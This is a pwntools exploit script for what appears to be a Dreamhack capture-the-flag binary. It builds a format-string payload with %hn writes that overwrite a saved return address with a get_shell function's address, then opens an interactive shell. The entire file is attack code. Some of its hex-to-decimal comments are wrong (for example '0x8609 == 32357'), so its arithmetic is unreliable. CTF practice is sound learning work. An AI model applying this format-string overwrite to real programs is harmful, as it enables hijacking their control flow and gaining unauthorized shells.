from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

# p = remote("host1.dreamhack.games", 12850)
p = process("./basic_exploitation_003")
e = ELF("./basic_exploitation_003")
gdb.attach(p)

get_shell = 0x8048669
ret = 0xffffd13c

slog("ret",ret)

payload = p32(ret+2)
payload += p32(ret)

#0x804 == 2052 - 8 => 2044
payload += b"%2044c%1$hn"

#0x8609 == 32357 - 2052 => 30305
payload += b"%30305c%2$hn"

p.send(payload)
# p.recv()
p.interactive()